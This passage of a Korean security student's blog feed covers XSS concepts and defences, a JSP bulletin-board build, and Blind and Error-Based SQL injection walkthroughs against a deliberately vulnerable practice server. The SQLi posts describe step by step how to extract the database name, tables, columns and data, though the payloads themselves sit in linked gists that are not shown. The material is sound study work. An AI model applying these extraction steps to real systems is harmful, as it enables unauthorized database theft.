  <li>서버로부터 받은 페이지를 사용자가 읽을 때 사용자 브라우저에서 악성 스크립트를 동작 시킨다.</li>
  <li>사용자 브라우저에서 페이지 구조를 동적으로 변경한다.</li>
  <li>사용자는 공격자에게 민감한 데이터를 전송한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTCArIOyVheyEsSDsiqTtgazrpr3tirjrpbwg7KCE64us7ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiBVUkzsnYQg7YG066at7ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDshJzrsoQgOiDtjpjsnbTsp4Drpbwg7JqU7LKt7ZWc64ukLlxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDtjpjsnbTsp4Drpbwg7J2R64u17ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiDslYXshLEg7Iqk7YGs66a97Yq47JeQIOydmO2VtCDtjpjsnbTsp4Ag6rWs7KGw6rCAIOuPmeyggeycvOuhnCDrs4DtlZzri6QuXG7sgqzsmqnsnpAgLT4-IOqzteqyqeyekCA6IOuvvOqwkO2VnCDrjbDsnbTthLDrpbwg7KCE7Iah7ZWc64ukLiIsIm1lcm1haWQiOm51bGx9" /></p>

<h3 id="대응-방안">대응 방안</h3>
<ul>
  <li>신뢰할 수 없는 사이트, 메일을 피해야한다.</li>
  <li>콘텐츠 보안 정(CSP) 사용한다. 스크립트 실행에 대한 정책을 설정하여 예방한다.</li>
  <li>HTTP 응답에 유저가 입력한 데이터가 존재한다면 입력한 데이터를 인코딩 해야 한다.</li>
  <li>입력에 필터를 적용해야 한다. 즉 어떤 데이터 유효하고 예상되는 입력인지 확인한다. 특수 문자를 단순 문자로 인식하게 한다.</li>
</ul>

<h4 id="xss-필터링">XSS 필터링</h4>

<table>
  <thead>
    <tr>
      <th>문자</th>
      <th>인코딩 된 문자</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&amp;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;amp;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;lt;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&gt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;gt;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">'</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#x27;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">"</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;quot;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">(</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#40;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">)</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#41;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#x2F;</code></td>
    </tr>
  </tbody>
</table>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://junhyunny.github.io/information/security/spring-mvc/stored-cross-site-scripting/">저장형 XSS(Stored Cross Site Scripting) 공격과 방어 - Junhyunny’s Devlogs</a></li>
  <li><a href="https://zidarn87.tistory.com/217">토픽 스터디 / 정보보안 / XSS(Cross Site Scripting) 공격 - 해킹</a></li>
  <li><a href="https://velog.io/@ckdwns9121/%ED%86%A0%ED%81%B0token%EC%9D%80-%EC%96%B4%EB%96%BB%EA%B2%8C-%ED%83%88%EC%B7%A8-%EB%8B%B9%ED%95%98%EB%8A%94%EA%B0%80">토큰(token)은 어떻게 탈취 당하는가? (velog.io)</a></li>
  <li><a href="https://portswigger.net/web-security/cross-site-scripting">What is cross-site scripting (XSS) and how to prevent it?</a></li>
  <li><a href="https://dar0m.tistory.com/227">XSS(Cross-site Scripting) 공격 (tistory.com)</a></li>
  <li><a href="https://4rgos.tistory.com/1">XSS(Cross Site Scripting) 공격이란? :: ARGOS (tistory.com)</a></li>
  <li><a href="https://nordvpn.com/ko/blog/xss-attack/#head3-3">크로스 사이트 스크립팅의 정의 및 공격 유형 NordVPN</a></li>
  <li><a href="https://namu.wiki/w/XSS">XSS - 나무위키 (namu.wiki)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="웹 해킹" /><summary type="html"><![CDATA[XSS 개념 클라우드 측 코드를 삽입하는 공격이다. 클라이언트의 브라우저에서 실행된다. 피해자 컴퓨터(브라우저)에 악의적인 코드를 실행되게 하는 공격이다. Cross-site Scripting 의 약자이다. 개발자가 고려하지 않는 기능을 동작시킨다.]]></summary></entry><entry><title type="html">웹서버 만들기 10 메뉴 버튼 및 게시판 제작</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90/" rel="alternate" type="text/html" title="웹서버 만들기 10 메뉴 버튼 및 게시판 제작" /><published>2023-05-04T00:00:00+09:00</published><updated>2023-05-04T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C10%EB%A9%94%EB%89%B4%EB%B2%84%ED%8A%BC%EB%B0%8F%EA%B2%8C%EC%8B%9C%ED%8C%90/"><![CDATA[<h2 id="jsp-페이지-모듈화">JSP 페이지 모듈화</h2>
<ul>
  <li>액션 태그를 사용해서 화면을 모듈화시켜 코드가 중복되는 것을 방지 할 수 있다.</li>
</ul>

<h3 id="-액션-태그-사용법"><jsp:include> 액션 태그 사용법</jsp:include></h3>
<ul>
  <li>
    <p>사용법
<script src="https://gist.github.com/MinGyu2/049ae15892e904872ad0834e58949544.js"></script></p>
  </li>
  <li>
    <p>태크 속성 설명</p>
    <ul>
      <li>page : 포함할 JSP 페이지</li>
      <li>flush : true 로 설정하면 현재 페이지가 지금까지 버퍼에 저장한 내용을 웹 브라우저로 전송하게 된다.  일단 헤더 정보가 웹 브라우저에 전송이 되고 나면 헤더 정보를 추가해도 결과가 반영되지 않는다. 따라서 일반적으로는 ‘false’로 지정한다.</li>
    </ul>
  </li>
</ul>

<h3 id="-액션-태그-처리-과정"><jsp:include> 액션 태그 처리 과정</jsp:include></h3>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4gbWFpbi5qc3AgOiDsmpTssq1cbm1haW4uanNwIC0-PiBtYWluLmpzcCA6IOy2nOugpSDrgrTsmqkxXG5tYWluLmpzcCAtPj4gc3ViLmpzcCA6IOyalOyyrVxuc3ViLmpzcCAtPj4gbWFpbi5qc3AgOiDstpzroKUg64K07JqpIHN1YlxubWFpbi5qc3AgLT4-IG1haW4uanNwIDog7Lac66ClIOuCtOyaqTJcbm1haW4uanNwIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOy2nOugpSDrsoTtjbwg64K07JqpIOyghOuLrCIsIm1lcm1haWQiOm51bGx9" /></p>

<h3 id="활용">활용</h3>
<ul>
  <li>
    <jsp:include> 액션 태그를 만들고 있는 서버에 적용시켰다.
</jsp:include>
  </li>
  <li>모듈화가 가능하여 코드가 좀 더 깔끔해졌다.</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/31990118/236090570-d82e92f3-80ab-443c-b49e-51d778305b87.png" alt="Pasted image 20230503235614" /></p>

<h3 id="jsp">JSP</h3>
<ul>
  <li>main_page.jsp
<script src="https://gist.github.com/MinGyu2/9303d6fa76e692d462a8e14cc207c5aa.js"></script></li>
  <li>home.jsp
<script src="https://gist.github.com/MinGyu2/772a5f530bbe6aeea2276afddb4a4b90.js"></script></li>
</ul>

<h2 id="메뉴-버튼">메뉴 버튼</h2>
<ul>
  <li>메인 페이지에 홈 버튼과 게시판 버튼을 만들었다.<br /><img src="https://user-images.githubusercontent.com/31990118/236091135-887cf47e-a593-4a8e-b36e-23d851d3805b.png" alt="Pasted image 20230503231355" /></li>
  <li>Home 버튼을 누르면 로그인하고 접속 하였을 때 가장처음 화면에 나타나는 페이지이다.</li>
  <li>게시판 버튼을 누르면 서버에 저장된 게시글들을 확인해 볼 수 있다.</li>
</ul>

<h3 id="jsp-1">JSP</h3>
<ul>
  <li>servlet 부터 메뉴 리스트를 받아와 사용하였다.</li>
  <li>다음 코드는 메뉴창을 나타내는 부분이다.</li>
  <li>main_page.jsp
<script src="https://gist.github.com/MinGyu2/218ef37523342f45dfa8ac7676c54ce3.js"></script></li>
</ul>

<h3 id="servlet-java-코드">Servlet (Java 코드)</h3>
<ul>
  <li>메뉴 servlet 코드에서 메뉴 리스트를 만든 다음 메인 jsp 페이지로 포워딩 해준다.</li>
  <li>메인 jsp 페이지 파일에서 메뉴 리스트를 받아 html 파일을 완성 시키고 유저에게 페이지를 보여준다.</li>
  <li>MainPage.java
<script src="https://gist.github.com/MinGyu2/60f564ef505632451acd34c7fbfc90a8.js"></script></li>
</ul>

<h2 id="게시판">게시판</h2>

<h3 id="게시판-리스트-확인">게시판 리스트 확인</h3>
<ul>
  <li>게시판 버튼을 누르면 서버에 저장된 모든 글들을 볼 수 있다.</li>
  <li>글을 작성한 사람 이름, 글 제목 그리고 글 요약을 살펴볼 수 있다.</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/31990118/236091519-177d6bf1-2f52-4705-80db-174d6430dee8.png" alt="Pasted image 20230503235957" /></p>

<h4 id="jsp-2">JSP</h4>
<h5 id="main_pagejsp">main_page.jsp</h5>
<ul>
  <li>
    <jsp:include> 액션 태그를 이용하였다.

</jsp:include>
  </li>
</ul>
<script src="https://gist.github.com/MinGyu2/a7f9b3c687ae254e052484f934159038.js"></script>

<h5 id="notice_boardjsp">notice_board.jsp</h5>
<ul>
  <li>for을 이용하여 servlet 으로 부터 받은 게시판 목록들을 나열하였다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/2fe9c7d42b55a006bcfc6dc05c0d89fa.js"></script>

<h4 id="servlet">Servlet</h4>
<h5 id="mainpagejava">MainPage.java</h5>
<ul>
  <li>NoticeBoardDAO 클래스를 이용하여 게시판 목록들을 DB 에서 불러왔다. 그리고 배열에 저장해 주었다.</li>
  <li>setAttribute 를 이용하여 jsp 페이지로 배열을 전달해 주었다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/e335fc6b887792c12db6660d9a218de0.js"></script>

<p><br /><br /></p>

<h3 id="게시판-글-자세히-읽기">게시판 글 자세히 읽기</h3>
<ul>
  <li>게시판 리스트 중 하나를 클릭하여 들어가면 스스로 작성한 글이나, 다른 사용자가 작성한 글을 읽을 수 있다.</li>
  <li>자기 자신이 쓴 글에 들어가면 글 수정을 위한 버튼이 나타난다.</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/31990118/236093552-1a3768f9-3b3e-4909-96dc-e60d1933a0bb.png" alt="Pasted image 20230504000326" />
<img src="https://user-images.githubusercontent.com/31990118/236093639-ba25e841-0276-42f5-8522-b2153563765c.png" alt="Pasted image 20230504000408" /></p>

<h4 id="jsp-3">JSP</h4>
<h5 id="notice_detailjsp">notice_detail.jsp</h5>
<ul>
  <li>
    <jsp:include> 액션태그를 사용하였다.

</jsp:include>
  </li>
</ul>
<script src="https://gist.github.com/MinGyu2/dc906936bba90e8490400a1920312804.js"></script>

<h5 id="noticejsp">notice.jsp</h5>
<ul>
  <li>servlet 클래스에서 게시물 정보를 넘겨준다.</li>
  <li>게시글 작성자와 현재 접속중인 유저가 동일하면 수정 버튼을 활성화 한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/020b226f69db9478f8f899cf96839770.js"></script>

<h4 id="servlet-1">Servlet</h4>
<h5 id="mainpagejava-1">MainPage.java</h5>
<ul>
  <li>Get 을 통해 게시글의 sid를 받는다. Get으로 받은 <code class="language-plaintext highlighter-rouge">detailid</code> 입력을 가져온다.</li>
  <li>setAttribute 를 통해 게시글 정보를 jsp 한테 넘겨준다.</li>
  <li>게시글 작성자와 현재 접속중인 유저가 동일하면 수정 버튼을 활성화 한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/a1917d62bb85a89be487042c767cf58e.js"></script>

<p><br /><br /></p>

<h3 id="게시판-새로운-글-쓰기">게시판 새로운 글 쓰기</h3>
<ul>
  <li>게시판에서 글쓰기 버튼을 클릭 하면 글쓰기 페이지가 나온다.</li>
  <li>제목 또는 본문 둘중에 하나라도 빈칸이면 저장이 안된다.</li>
</ul>

<p><img src="https://user-images.githubusercontent.com/31990118/236095373-403e687b-f55c-4db5-a59a-f0abc3320fbb.png" alt="Pasted image 20230503231355" />
<img src="https://user-images.githubusercontent.com/31990118/236095408-bcc22308-3e11-4a65-ab53-f482d6c64925.png" alt="Pasted image 20230504003204" /></p>

<h4 id="jsp-4">JSP</h4>
<h5 id="notice_writejsp">notice_write.jsp</h5>
<ul>
  <li>제목과 글을 입력하고 저장 버튼을 눌러주면 POST 방식으로 제목과 글을 서버로 전송한다.</li>
  <li>취소 버튼을 누르면 이전 페이지 다시 되돌아 간다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/a026cd33b55c1112bceff74b40c6ecb6.js"></script>

<h4 id="servlet-2">Servlet</h4>
<h5 id="mainpagejava-2">MainPage.java</h5>
<ul>
  <li>noticeBoardWrite uri 로 접속하면 글쓰기 jsp 페이지로 넘어간다.</li>
  <li>글쓰기 jsp 페이지로 noticeBoardSave uri를 넘겨준다.</li>
  <li>저장 버튼을 눌러 저장을 할 때는 오직 POST 전송일 때만 가능하다.</li>
  <li>서버는 제목과 글을 POST 파라미터로 받는다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/879701715b88f54216b4aaa469b096a4.js"></script>

<p><br /><br /></p>

<h2 id="db">DB</h2>

<h3 id="게시판-사용자-생성">게시판 사용자 생성</h3>
<ul>
  <li>게시판 글을 저장하기 위한 사용자를 먼저 만들어 주었다.<br /><script src="https://gist.github.com/MinGyu2/55b19361307bf1b1de4d1cd0807c04e6.js"></script></li>
</ul>

<h3 id="게시판-테이블-생성">게시판 테이블 생성</h3>
<ul>
  <li>게시판 글을 저장하는 테이블을 만들어 주었다.<br /><script src="https://gist.github.com/MinGyu2/a1528a7022d98d4db54891421b5acdd6.js"></script></li>
</ul>

<h3 id="게시판-글-올릴-때-사용한-sql-문">게시판 글 올릴 때 사용한 SQL 문</h3>
<ul>
  <li>다음 sql 쿼리문을 이용하여 글을 저장하였다.<br /><script src="https://gist.github.com/MinGyu2/ce3e8b3d981950a7141949a12be9c2a3.js"></script></li>
</ul>

<h3 id="게시판-글-삭제">게시판 글 삭제</h3>
<ul>
  <li>키인 <code class="language-plaintext highlighter-rouge">sid</code> 를 기준으로 글을 삭제한다.<br /><script src="https://gist.github.com/MinGyu2/fce1909509ddeac56a6388150bc807ee.js"></script></li>
</ul>

<h4 id="글을-삭제할-때-조건">글을 삭제할 때 조건</h4>
<ul>
  <li>관리자는 모든 글을 삭제 가능하다.</li>
  <li>사용자는 자기 자신이 쓴 글만 삭제가 가능해야한다.</li>
</ul>

<h2 id="전체-코드">전체 코드</h2>
<ul>
  <li>main_page.jsp
<script src="https://gist.github.com/MinGyu2/e72b96cfba044c98a0eae09899473d6c.js"></script></li>
</ul>

<h2 id="발생한-오류">발생한 오류</h2>
<h3 id="create-session-권한-오류">create session 권한 오류</h3>
<ul>
  <li>오류 내용<br /><script src="https://gist.github.com/MinGyu2/40bf1fba073564873745a6dc81d79744.js"></script></li>
  <li>해결법<br /><script src="https://gist.github.com/MinGyu2/bc97c6225891a1e111bf525a3260b546.js"></script></li>
</ul>

<h3 id="create-table-할-때-부적합한-식별자-오류">create table 할 때 부적합한 식별자 오류</h3>
<ul>
  <li>오류 내용<br /><script src="https://gist.github.com/MinGyu2/f672b13ed2b599dbe7ce42c6740a3d23.js"></script></li>
  <li>해결법<br /><script src="https://gist.github.com/MinGyu2/66fbc7cbd7a1ef5ea30fd8964a4bc23f.js"></script></li>
</ul>

<h3 id="테이블스페이스-오류">테이블스페이스 오류</h3>
<ul>
  <li>오류 내용
<script src="https://gist.github.com/MinGyu2/3a32023b66ca251333fabdc13e339532.js"></script></li>
  <li>해결법
<script src="https://gist.github.com/MinGyu2/d928036f484915143ef937e0ce36ed1c.js"></script></li>
</ul>

<h3 id="열을-사용할-수-없습니다">열을 사용할 수 없습니다.</h3>
<ul>
  <li>오류 내용
<script src="https://gist.github.com/MinGyu2/86f8126d9d8d4888fb9cdacf5467e9ce.js"></script></li>
  <li>해결법
<script src="https://gist.github.com/MinGyu2/a9ca4d9719b57d2401daee09dfa26ecf.js"></script></li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://all-record.tistory.com/106">JSP 페이지 모듈화 &lt;jsp:include&gt; 액션태그 (tistory.com)</a></li>
  <li><a href="https://ojji.wayful.com/2015/04/HTML-DIV-tag-Scroll-Bar-Display-Hidden-Set-Overflow-auto-hidden-scroll-white-space-nowrap-overflow-x-overflow-y.html">HTML DIV tag: 스크롤바 넣기와 제어하기 </a></li>
  <li><a href="https://ju-won.tistory.com/14">div 강제 줄바꿈 처리 (tistory.com)</a></li>
  <li><a href="https://dogsavestheworld.tistory.com/275">JSP 게시판 만들기 - (10) 글쓰기 기능 구현 (CREATE) (tistory.com)</a></li>
  <li><a href="https://velog.io/@leemember/CSS-textarea-%ED%81%AC%EA%B8%B0-%EA%B3%A0%EC%A0%95%ED%95%98%EA%B8%B0">textarea 크기 고정하기 (velog.io)</a></li>
  <li><a href="https://totoscoming-coding.tistory.com/36"> HTML 예제 - 게시판 글쓰기 창 :: 쩝쩝산중 코딩로그 (tistory.com)</a></li>
  <li><a href="https://gent.tistory.com/323">오라클 컬럼(Column) 추가, 삭제 방법 (컬럼 순서 변경) (tistory.com)</a></li>
  <li><a href="https://offbyone.tistory.com/316">오라클 에러 ORA-00984: 열을 사용할 수 없습니다 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="웹" /><category term="JSP" /><category term="SERVLET" /><category term="JAVA" /><summary type="html"><![CDATA[메뉴 버튼 및 게시판 제작 하기]]></summary></entry><entry><title type="html">Blind SQL Injection 과정</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/BlindSQLi/" rel="alternate" type="text/html" title="Blind SQL Injection 과정" /><published>2023-04-30T00:00:00+09:00</published><updated>2023-04-30T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/BlindSQLi</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/BlindSQLi/"><![CDATA[<h2 id="이전-포스팅">이전 포스팅</h2>
<p><a href="https://mingyu2.github.io/SQLi%EB%B0%A9%EB%B2%95/">Union SQLi 과 Error Based SQLi 과정 정리.</a></p>

<h2 id="mysql-사전-지식">MYSQL 사전 지식</h2>

<h3 id="db-명-출력하기">DB 명 출력하기</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">database</span><span class="p">()</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
</code></pre></div></div>

<h3 id="테이블명-출력하기">테이블명 출력하기</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'DB명'</span>
</code></pre></div></div>

<h3 id="컬럼명-출력하기">컬럼명 출력하기</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'테이블명'</span>
</code></pre></div></div>

<h2 id="blind-sqli">Blind SQLi</h2>
<ul>
  <li>참과 거짓 조건에 따른 응답을 이용하여 한글자씩 알아내어 데이터를 추출하는 공격이다.</li>
</ul>

<h3 id="조건">조건</h3>
<ul>
  <li>결과가 화면에 안나오는 곳에서 사용한다.</li>
  <li>참과 거짓 조건에 따라 응답이 다른 곳에서 이용가능하다.</li>
</ul>

<h3 id="필요-함수">필요 함수</h3>
<ul>
  <li>substring</li>
  <li>ascii</li>
</ul>

<h3 id="과정">과정</h3>
<ol>
  <li>서버에서 어떤 질의문을 사용하는지 예측하기.
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">x</span> <span class="k">from</span> <span class="n">x</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'x'</span><span class="p">;</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>Blind SQLi 을 사용하기 위하여 참/거짓 일때 응답 결과가 다른지 확인하기.<br /><script src="https://gist.github.com/MinGyu2/f65663add3c2cf18dc2b4d996a442919.js"></script></p>
  </li>
  <li><code class="language-plaintext highlighter-rouge">select</code> 문 사용 가능한지 확인하기.<br /><script src="https://gist.github.com/MinGyu2/4fe0c4b88eaf431299f49c54cb89d8f1.js"></script></li>
  <li>공격 포맷 만들기.<br /><script src="https://gist.github.com/MinGyu2/b7db2b39edc6e326b2426cc6a34fdeb5.js"></script></li>
  <li>database 이름 추출하기. 한 문자씩 알아내어야 한다.<br /><script src="https://gist.github.com/MinGyu2/cd056483c528aad3bb968bf459155150.js"></script></li>
  <li>테이블 이름들 추출하기. <br /><script src="https://gist.github.com/MinGyu2/65ae660dd4ef296c1a50279c04dc8467.js"></script></li>
  <li>컬럼 명 추출 하기.<br /><script src="https://gist.github.com/MinGyu2/17bae3c8991982ee9e076df17b090fa7.js"></script></li>
  <li>정보 추출하기.<br /><script src="https://gist.github.com/MinGyu2/5b9e37325e12999931619d2a70f71dac.js"></script></li>
</ol>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="sql injection" /><category term="Mysql" /><category term="DB" /><summary type="html"><![CDATA[Blind SQL Injection 과정 정리.]]></summary></entry><entry><title type="html">Error Based SQL Injection 연습</title><link href="http://localhost:4000/ErrorBasedSQLi/" rel="alternate" type="text/html" title="Error Based SQL Injection 연습" /><published>2023-04-27T00:00:00+09:00</published><updated>2023-04-27T23:13:00+09:00</updated><id>http://localhost:4000/ErrorBasedSQLi</id><content type="html" xml:base="http://localhost:4000/ErrorBasedSQLi/"><![CDATA[<ul>
  <li>Error Based SQL Injection을 연습하기 위해 DB 에러를 보여주는 로그인 페이지를 만들었다.</li>
</ul>

<h3 id="조건">조건</h3>
<ul>
  <li>SQL 질의문 결과가 화면에 안보임. (로그인, 아이디 중복 체크)</li>
  <li>DB Error 메세지가 화면에 출력되어야 한다.</li>
</ul>

<h3 id="sqli-취약점-서버-환경">SQLi 취약점 서버 환경</h3>
<hr />
<ul>
  <li>웹서버 : 우분투 Ubuntu 22.04.2 LTS</li>
  <li>DB 서버 : Oracle DB oracle-database-xe-21c</li>
</ul>

<h3 id="과정">과정</h3>
<hr />
<ol>
  <li>서버에서 어떤 질의문을 사용하고 있는지 추측하기.
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">xxx</span> <span class="k">from</span> <span class="n">xxx</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'x'</span> <span class="p">....</span>
</code></pre></div>    </div>
    <p><img src="https://user-images.githubusercontent.com/31990118/234779915-76b7335a-3e35-4f0f-97de-a902fe96ad7b.png" alt="Pasted image 20230427144207" /></p>
  </li>
  <li>의도적으로 오류 발생 시킨다음 오류 내용 확인 한다. SQL 오류가 출력되는 것을 확인할 수 있다.
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="n">x</span><span class="s1">'
</span></code></pre></div>    </div>
    <p><img src="https://user-images.githubusercontent.com/31990118/234780248-2ebfb6be-ab2c-4952-879c-72825539b485.png" alt="Pasted image 20230427144608" /></p>
  </li>
  <li>Error Based SQL Injection Function 동작하는지 확인하기. <code class="language-plaintext highlighter-rouge">test</code> 단어가 오류에 출력되는 것을 확인할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/293d020a722eab98690d36a3d0941b2d.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/234782415-65e101a8-f895-4990-ab70-23b9ee55828e.png" alt="Pasted image 20230427145024" /></li>
  <li>사용자 이름 구하기. <code class="language-plaintext highlighter-rouge">C##DBFORPROB</code> 라는 것을 알 수 있다.<br /><script src="https://gist.github.com/MinGyu2/bece6ae6ed2f5d8876d443bb48e43594.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/234782649-f607470f-6044-4410-b577-819ff2a794d8.png" alt="Pasted image 20230427145221" /></li>
  <li><strong>Table</strong> 이름 구하기. <code class="language-plaintext highlighter-rouge">MEMBERS</code> 테이블이 존재하는 것을 확인할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/e6bac283e7b366b8b86d8cb0aa8af81e.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/234783063-ee4f03be-69e8-49f9-b0df-0d9949055a5e.png" alt="Pasted image 20230427150937" /></li>
  <li><strong>column</strong> 이름 구하기.<br /><script src="https://gist.github.com/MinGyu2/18aed7c05b1894da21c4f243ecf50fc7.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/234784240-620cbc18-efed-4af0-baf2-f881f587d037.png" alt="Pasted image 20230427151541" /><br /><img src="https://user-images.githubusercontent.com/31990118/234784314-9d32b04c-8828-4ef2-b5cc-4f0924a2ff2a.png" alt="Pasted image 20230427151801" /></li>
  <li>데이터 추출하기.<br /><script src="https://gist.github.com/MinGyu2/9d815c9e7f74b80823ac81c15d60aec8.js"></script><br /><img src="https://user-images.githubusercontent.com/31990118/234785665-fe1ac79a-2812-4c9f-a2b8-709ec4eac7d8.png" alt="Pasted image 20230427160531" /></li>
</ol>

<ul>
  <li>추출한 정보 확인<br /><img src="https://user-images.githubusercontent.com/31990118/234787698-dd12b6ff-d729-4617-9be5-95f2ef87e07a.png" alt="Pasted image 20230427152642" /><br /><img src="https://user-images.githubusercontent.com/31990118/234788225-fbe9d647-85ef-46c1-8d81-2535e4979f08.png" alt="Pasted image 20230427161753" /></li>
</ul>

<h3 id="참고사이트">참고사이트</h3>
<hr />
<ul>
  <li><a href="https://stackoverflow.com/questions/470542/how-do-i-limit-the-number-of-rows-returned-by-an-oracle-query-after-ordering">sql - How do I limit the number of rows returned by an Oracle query after ordering? - Stack Overflow</a></li>
  <li><a href="https://jwklife.tistory.com/45">오라클 테이블 &amp; 컬럼 조회 하는 방법 :: 인 생 (tistory.com)</a></li>
  <li><a href="https://mymuseum.tistory.com/9">Oracle DB (데이터 베이스) 정보 찾기 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="DB" /><category term="sql injection" /><summary type="html"><![CDATA[error based sql injection 을 연습하기 위하여 직접 db 에러를 보여주는 로그인 페이지를 만들었다.]]></summary></entry><entry><title type="html">웹서버 만들기 9 주소검색기능</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C9%EC%A3%BC%EC%86%8C%EA%B2%80%EC%83%89/" rel="alternate" type="text/html" title="웹서버 만들기 9 주소검색기능" /><published>2023-04-26T00:00:00+09:00</published><updated>2023-04-26T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C9%EC%A3%BC%EC%86%8C%EA%B2%80%EC%83%89</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C9%EC%A3%BC%EC%86%8C%EA%B2%80%EC%83%89/"><![CDATA[<h1 id="주소-검색-기능">주소 검색 기능</h1>
<ul>
  <li>서버
    <ul>
      <li>오라클 DB 서버 : oracle-database-xe-21c</li>
    </ul>
  </li>
  <li>구조
    <ul>
      <li>우편번호</li>
      <li>주소( 시도 도로명 건물번호본번 건물번호부번 )</li>
      <li>주소2(층수 부가 정보)</li>
    </ul>
  </li>
</ul>

<h2 id="주소찾기-동작과정">주소찾기 동작과정</h2>
